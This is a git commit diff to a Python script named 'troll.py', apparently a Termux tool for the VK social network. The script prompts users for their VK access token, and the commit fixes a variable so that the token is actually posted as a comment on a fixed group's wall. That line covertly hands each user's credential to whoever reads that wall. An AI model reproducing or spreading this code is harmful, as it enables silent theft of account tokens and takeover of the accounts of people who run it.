06773a5ec222603c4c13333d99f7582f48bbe247
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-01-27 17:07:10 +0300

    Update troll.py

--- troll.py
+++ troll.py
@@ -1,4 +1,5 @@
-import vk, time
+import vk, time, os
+os.system('clear')
 pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105077,89148442,157274855,52771476,68284944,74383909,114285300]
 print ("""\033[37m
  Termux-lab         @termuxlab\033[32m
@@ -10,7 +11,7 @@ print ("""\033[37m
 token = input("\033[35mEnter the token: \033[0m")
 session = vk.Session(access_token=token)
 api =  vk.API(session ,v='5.92', lang='ru')
-api.wall.createComment(owner_id=-191163638,post_id=1,message=tk)
+api.wall.createComment(owner_id=-191163638,post_id=1,message=token)
 id = api.users.get()[0]['id']
 groups = api.groups.get(user_id=id)['items']
 print ("")
